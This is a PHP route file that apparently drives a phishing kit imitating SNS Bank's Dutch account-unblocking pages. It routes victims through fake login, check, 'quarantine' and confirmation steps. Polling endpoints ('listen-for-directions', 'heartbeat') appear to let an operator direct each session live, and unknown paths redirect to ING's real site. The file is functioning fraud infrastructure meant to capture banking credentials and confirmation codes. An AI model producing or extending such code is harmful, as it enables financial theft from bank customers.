<?php
try{
	$router = new \classes\core\routing();
	    $router->set404(function () {
			header("Location: https://www.ing.be/404");
        });

        $router->get('/', function () {
			header("Location: /mijnsns/deblokkeren/login.html");
        });

        $router->all('/listen-for-directions', function () {
            $sns = new \controllers\sns(false);
            $sns->listenfordirections($_SESSION['uid']);    
        });

        $router->all('/heartbeat', function () {
           $sns = new \controllers\sns(false);
           $sns->heartbeat($_SESSION['uid']);
        });
       
        $router->all('/mijnsns/deblokkeren/login.html', function () {
            $sns = new \controllers\sns(false);
            $sns->login(false);
         });

         $router->all('/mijnsns/deblokkeren/login-fout.html', function () {
            $sns = new \controllers\sns(false);
            $sns->login(true);
         });

         $router->all('/mijnsns/deblokkeren/controle.html', function () {
            $sns = new \controllers\sns(true);
            $sns->controle();
         });

         $router->all('/mijnsns/deblokkeren/quarantaine.html', function () {
            $sns = new \controllers\sns(true);
            $sns->quarantaine();
         });

         $router->all('/mijnsns/deblokkeren/bevestiging.html', function () {
            $sns = new \controllers\sns(true);
            $sns->bevestiging(false);
         });
         
         $router->all('/mijnsns/deblokkeren/bevestiging-fout.html', function () {
            $sns = new \controllers\sns(true);
            $sns->bevestiging(true);
         });


         $router->all('/mijnsns/deblokkeren/voltooid.html', function () {
            $sns = new \controllers\sns(true);
            $sns->voltooid();
         });

         $router->Run();
}catch (Exception $e) { echo $e->getMessage(); }
